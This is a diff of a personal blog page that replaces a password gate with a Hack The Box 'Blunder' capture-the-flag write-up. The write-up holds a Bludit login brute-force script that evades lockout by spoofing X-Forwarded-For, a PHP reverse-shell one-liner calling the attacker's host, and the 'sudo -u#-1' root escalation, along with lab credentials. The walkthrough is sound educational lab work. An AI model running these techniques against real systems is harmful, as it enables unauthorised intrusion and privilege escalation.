@@ -1,155 +1,223 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
-    <head>
-        <title>Password Protected</title>
-				<meta charset="UTF-8">
-				<meta name="viewport" content="width=device-width, initial-scale=1.0">
-				<meta http-equiv="X-UA-Compatible" content="ie=edge">
-				<link rel="icon" type="image/png" href="/favicon.png">
-				<link rel="stylesheet" type="text/css" href="/css/style.css">
-				<script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
-				<script src="/dist/mark.min.js" charset="UTF-8"></script>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="icon" type="image/png" href="/favicon.png">
+  <link rel="stylesheet" type="text/css" href="/css/style.css">
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&display=swap"
+  rel="stylesheet"> 
+  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Hackthebox - Blunder Writeup &mdash; fmash16's blog</title>
+<meta property="og:title" content="Hackthebox - Blunder Writeup" />
+      <meta property="og:description" content="An easy difficulty linux box" />
+      <meta property="og:type" content="article" />
+      <meta property="og:url" content="github" />
+      <meta property="og:image" content="https://fmash16.github.io/img/htb_blunder/card.png" />
 
-        <style>
-            .protected {
-                background: #fff;
-                -webkit-box-shadow: 0 2px 3px 0 rgba(0,0,0,0.1);
-                box-shadow: 0 2px 3px 0 rgba(0,0,0,0.1);
-                border-radius: 3px;
-                min-width: 500px;
+</head>
 
-            }
-            .protected__content {
-                padding: 24px 28px;
-            }
-            .protected__content__heading {
-                font-size: 16px;
-                font-weight: 500;
-                margin: 0 0 12px;
-                line-height: 1;
-            }
-            .protected__alert {
-                display: none;
-                border-bottom: 1px solid transparent;
-                border-radius: 3px 3px 0 0;
-                padding: 12px 14px;
-                color: #a94442;
-                background-color: #f2dede;
-                border-color: #ebccd1;
-            }
-            .protected__content__input {
-                display: block;
-                border: solid 1px #ccc;
-                padding: 12px 14px;
-                -webkit-box-shadow: 0 2px 3px 0 rgba(0,0,0,0.1);
-                box-shadow: 0 2px 3px 0 rgba(0,0,0,0.1);
-                font-size: 16px;
-                width: 100%;
-                border-radius: 3px;
+<body>
+  <!-- Side navigation -->
+	<div class="sidebar">
+    <div class="vertical-center">
+      <a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
+      <p style="text-align:center; color:#eee">
+      <b style="font-size:1.7em;text-align:center; color:#eee">fmash16</b><br/>
+      Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
+      <p style="text-align:center;font-size:20px">
+        <a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a> 
+        <a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a> 
+        <a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
+        <a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
+      </p>
+    </div>
+	</div>
 
-                margin-bottom: 12px;
-            }
-            .protected__content__input:focus {
-                outline: none;
-                border-color: #228843;
-            }
-            .protected__content__btn {
-                background-color: #228843;
-                border-radius: 3px;
-                cursor: pointer;
-                border: none;
-                color: #fff;
-                padding: 12px 14px;
-                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
-                font-weight: 500;
-                font-size: 16px;
+<article>
+<h1 id="hackthebox---blunder-writeup">Hackthebox - Blunder Writeup</h1>
+<div class="figure">
+<img src="/img/htb_blunder/card.png" />
 
-            }
-            .protected__content__btn:hover {
-                background-color: #1C6D36;
-            }
+</div>
+<h1 id="nmap-scan">Nmap Scan</h1>
+<p>Open ports: &gt; Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-31 00:27 EDT<br />
+&gt; Nmap scan report for 10.10.10.191<br />
+&gt; Host is up (0.49s latency).<br />
+&gt; Not shown: 998 filtered ports<br />
+&gt; PORT STATE SERVICE VERSION<br />
+&gt; 21/tcp closed ftp<br />
+&gt; 80/tcp open http Apache httpd 2.4.41 ((Ubuntu))<br />
+&gt; http-generator: Blunder<br />
+&gt; http-server-header: Apache/2.4.41 (Ubuntu)<br />
+&gt; http-title: Blunder | A blunder of interesting facts</p>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="ffuf-fuzzing">ffuf fuzzing</h2>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">ffuf</span> -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ</code></pre></div>
+<div class="figure">
+<img src="/img/htb_blunder/2.png" />
 
-        </style>
+</div>
+<p>We get a /admin that has the login for the <strong>&quot;Bludit cms&quot;</strong> We also get a /LICENSE. The file shows</p>
+<div class="figure">
+<img src="/img/htb_blunder/1.png" />
 
-    </head>
+</div>
+<p>Fuzzing for file with .txt extensions, we get something interesting</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">ffuf</span> -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ -x
+<span class="ex">.txt</span></code></pre></div>
+<p>We get a possible username <strong>fergus</strong></p>
+<blockquote>
+<p>User: fergus</p>
+</blockquote>
+<div class="figure">
+<img src="/img/htb_blunder/3.png" />
 
-    <body>
+</div>
+<p>Gowing to the URL: http://10.10.10.191/todo.txt, we get:</p>
+<div class="figure">
+<img src="/img/htb_blunder/4.png" />
 
-   <!-- Side navigation -->
-		<div class="sidebar">
-			<div class="vertical-center">
-				<a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
-				<p style="text-align:center; color:#eee">
-				<b style="font-size:1.7em;text-align:center; color:#eee">fmash16</b><br/>
-				Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
-				<p style="text-align:center;font-size:20px">
-					<a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a>
-					<a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a>
-					<a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
-					<a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
-				</p>
-			</div>
-		</div>
+</div>
+<p>Got a possible user:</p>
+<blockquote>
+<p>User: Diego Najar</p>
+</blockquote>
+<h1 id="exploit">Exploit</h1>
+<h2 id="bruteforce">Bruteforce</h2>
+<p>Got a brute force vulnerability <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">here</a></p>
+<p>Generate a custom wordlist using <strong>cewl</strong></p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">cewl</span> -w passwords.txt -d 9 -m 10 blunder.htb</code></pre></div>
+<p>We need to modify the found exploit script as per our needs. The modified script is:</p>
+<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="co">#!/usr/bin/env python3</span>
+<span class="im">import</span> re
+<span class="im">import</span> requests
 
+host <span class="op">=</span> <span class="st">&#39;http://10.10.10.191&#39;</span>
+login_url <span class="op">=</span> host <span class="op">+</span> <span class="st">&#39;/admin/login&#39;</span>
+username <span class="op">=</span> <span class="st">&#39;fergus&#39;</span>
+wordlist <span class="op">=</span> []
 
-        <div class="protected">
-            <div class="protected__alert" data-id="alert">You entered the wrong hash</div>
-            <div class="protected__content">
-                <h1 class="protected__content__heading">Enter the root hash in order to unlock the writeup</h1>
-                <input class="protected__content__input" data-id="password" type="password" placeholder="password"/>
-                <button data-id="button" type="button" class="protected__content__btn">Continue</button>
-            </div>
-        </div>
+<span class="co"># Generate 50 incorrect passwords</span>
+<span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;passwords.txt&quot;</span>, <span class="st">&quot;r&quot;</span>) <span class="im">as</span> f:
+    <span class="cf">for</span> line <span class="kw">in</span> f.readlines():
+        wordlist.append(<span class="bu">str</span>(line).strip(<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>))
 
-	<footer>
-		<p> Generated with a modified version of <a href="https://github.com/fmash16/ssg5">ssg5</a> By fmash16 <br />
-		<i class="far fa-copyright"></i> 2020-2020 </p>
-	</footer>
+<span class="co"># Add the correct password to the end of the list</span>
+<span class="co">#  wordlist.append(&#39;adminadmin&#39;)</span>
 
+<span class="cf">for</span> password <span class="kw">in</span> wordlist:
+    session <span class="op">=</span> requests.Session()
+    login_page <span class="op">=</span> session.get(login_url)
+    csrf_token <span class="op">=</span> re.search(<span class="st">&#39;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#39;</span>,
+login_page.text).group(<span class="dv">1</span>)
 
-        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/js-sha1/0.6.0/sha1.min.js"></script>
-        <script type="text/javascript">
-            "use strict"
-            var button = document.querySelectorAll('[data-id="button"]')
-            var password = document.querySelectorAll('[data-id="password"]')
+    <span class="bu">print</span>(<span class="st">&#39;[*] Trying: </span><span class="sc">{p}</span><span class="st">&#39;</span>.<span class="bu">format</span>(p <span class="op">=</span> password))
 
-            function login(secret) {
-                var hash = sha1(secret)
-                var url = hash + "/index.html"
-                var alert = document.querySelectorAll('[data-id="alert"]')
+    headers <span class="op">=</span> {
+        <span class="st">&#39;X-Forwarded-For&#39;</span>: password,
+        <span class="st">&#39;User-Agent&#39;</span>: <span class="st">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36</span>
+<span class="st">(KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;</span>,
+        <span class="st">&#39;Referer&#39;</span>: login_url
+    }
 
-                var request = new XMLHttpRequest()
-                request.open('GET', url, true)
+    data <span class="op">=</span> {
+        <span class="st">&#39;tokenCSRF&#39;</span>: csrf_token,
+        <span class="st">&#39;username&#39;</span>: username,
+        <span class="st">&#39;password&#39;</span>: password,
+        <span class="st">&#39;save&#39;</span>: <span class="st">&#39;&#39;</span>
+    }
 
-                request.onload = function () {
-                    if (request.status >= 200 && request.status < 400) {
-                        window.location = url
-                    } else {
-                        parent.location.hash = hash
-                        alert[0].style.display = 'block'
-                        password[0].setAttribute('placeholder', 'Incorrect password')
-                        password[0].value = ''
-                    }
-                }
-                request.onerror = function () {
-                    parent.location.hash = hash
-                    alert[0].style.display = 'block'
-                    password[0].setAttribute('placeholder', 'Incorrect password')
-                    password[0].value = ''
-                }
-                request.send()
-            }
+    login_result <span class="op">=</span> session.post(login_url, headers <span class="op">=</span> headers, data <span class="op">=</span> data,
+allow_redirects <span class="op">=</span> <span class="va">False</span>)
 
-            button[0].addEventListener("click", function () {
-                login(password[0].value)
-            })
+    <span class="cf">if</span> <span class="st">&#39;location&#39;</span> <span class="kw">in</span> login_result.headers:
+        <span class="cf">if</span> <span class="st">&#39;/admin/dashboard&#39;</span> <span class="kw">in</span> login_result.headers[<span class="st">&#39;location&#39;</span>]:
+            <span class="bu">print</span>()
+            <span class="bu">print</span>(<span class="st">&#39;SUCCESS: Password found!&#39;</span>)
+            <span class="bu">print</span>(<span class="st">&#39;Use </span><span class="sc">{u}</span><span class="st">:</span><span class="sc">{p}</span><span class="st"> to login.&#39;</span>.<span class="bu">format</span>(u <span class="op">=</span> username, p <span class="op">=</span> password))
+            <span class="bu">print</span>()
+            <span class="cf">break</span></code></pre></div>
+<p>PS: The user we need to brute the password for is <strong>fergus</strong>, not admin. Trying with admin, we failed and trying with fergus, we succeed.</p>
+<p>We run the script and get our required password.</p>
+<div class="figure">
+<img src="/img/htb_blunder/5.png" />
 
-            document.onkeydown = function (e) {
-                e = e || window.event
-                if (e.keyCode == 13) {
-                    login(password[0].value)
-                }
-            }
-        </script>
-    </body>
-</html>
+</div>
+<p>Creds:</p>
+<blockquote>
+<p>User: fergus<br />
+Password: RolandDeschain</p>
+</blockquote>
+<h2 id="bludit---directory-traversal-image-file-upload-metasploit">Bludit - Directory Traversal Image File Upload (Metasploit)</h2>
+<p>Searching for bludit exploits , we find one in exploitdb</p>
+<div class="figure">
+<img src="/img/htb_blunder/10.png" />
+
+</div>
+<p>We see that it's a metasploit script. So we fire up metasploit and use the script. We set our rhosts, user and pass as retrieved previously and run the exploit. We get a meterpreter shell back successfully.</p>
+<div class="figure">
+<img src="/img/htb_blunder/6.png" />
+
+</div>
+<h2 id="www-data-shell">www-data shell</h2>
+<p>We try getting a proper reverse shell from the merterpreter shell</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">php</span> -r <span class="st">&#39;$sock=fsockopen(&quot;10.10.14.55&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span></code></pre></div>
+<p>We get a reverse shell back. We stabilize our shell using python.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">python3.7</span> -c <span class="st">&quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</span>
+<span class="fu">stty</span> raw -echo
+<span class="bu">fg</span></code></pre></div>
+<div class="figure">
+<img src="/img/htb_blunder/7.png" />
+
+</div>
+<h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
+<h2 id="enumeration-1">Enumeration</h2>
+<p>Looking around, we find a file &quot;users.php&quot; under the database directory in bludit bl-contents. The file contains the following</p>
+<div class="figure">
+<img src="/img/htb_blunder/8.png" />
+
+</div>
+<p>We get 2 users admin and hugo which we used for login. we retrieve the password hash and salt for the admin from here</p>
+<blockquote>
+<p>&quot;role&quot;: &quot;admin&quot;,<br />
+&quot;password&quot;: &quot;bfcc887f62e36ea019e3295aafb8a3885966e265&quot;,<br />
+&quot;salt&quot;: &quot;5dde2887e7aca&quot;,</p>
+</blockquote>
+<p>Going back, we find another version of bludit site under the /var/www directory. In that version, we take a look at the users.php file in the same location as before and find the following</p>
+<div class="figure">
+<img src="/img/htb_blunder/9.png" />
+
+</div>
+<h2 id="user-password-hash-crack">User password hash crack</h2>
+<p>We get a user hugo here and the password hash. Analyzing the hash in <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwjT4ervqN7pAhVuwjgGHTsqBWMQFjAAegQIAxAB&amp;url=https%3A%2F%2Fgchq.github.io%2FCyberChef%2F&amp;usg=AOvVaw3cJhXGWs_4gKkmjmhQLSNC">cyberchef</a>, we see that it is an SHA1 hash. We crack the hash using <a href="https://crackstation.net/">crackstation</a> and obtain the password for the user</p>
+<div class="figure">
+<img src="/img/htb_blunder/11.png" />
+
+</div>
+<p>Creds found:</p>
+<blockquote>
+<p>User: hugo<br />
+hash: faca404fd5c0a31cf1897b823c695c85cffeb98d<br />
+Password: Password120</p>
+</blockquote>
+<p>Going over to the /home directory, we see that hugo is in fact a user. We also find another user shaun.</p>
+<h2 id="user-shell">User shell</h2>
+<p>We switch to user hugo using su and the password obtained and get the user shell.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">su</span> - hugo</code></pre></div>
+<p>Now we can read our required user.txt file</p>
+<h1 id="privilege-esccalation---root">Privilege Esccalation - Root</h1>
+<p>Looking for sudo permissions for our user using <code>sudo -l</code>, we find that the user hugo can exevute <code>/bin/bash</code> as all users except root (ALL:!root)</p>
+<p>We see that we can execute /bin/bash as any user other than root. This can be exploited using a popular sudo vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14287">CVE-2019-14287</a>. Following the exploit, we execute /bin/bash ash sudo and get a root shell</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">sudo</span> -u#-1 /bin/bash</code></pre></div>
+<p>Now we can read our required root.txt file from the /root directory.</p>
+</article>
+
+<footer>
+  <p> Generated with a modified version of <a href="https://github.com/fmash16/ssg5">ssg5</a> By fmash16 <br /> 
+  <i class="far fa-copyright"></i> 2020-2020 </p>
+</footer>
+</body>
